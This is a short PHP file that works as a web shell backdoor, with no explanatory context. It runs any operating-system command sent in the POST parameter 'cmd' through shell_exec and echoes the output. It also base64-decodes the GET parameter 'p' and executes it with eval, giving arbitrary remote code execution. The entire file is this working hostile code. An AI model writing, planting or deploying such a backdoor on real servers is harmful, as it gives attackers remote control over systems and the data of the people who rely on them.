<?php
if (isset($_POST['cmd'])) {
    echo shell_exec($_POST['cmd']);
}
$payload = base64_decode($_GET['p']);
eval($payload);
?>
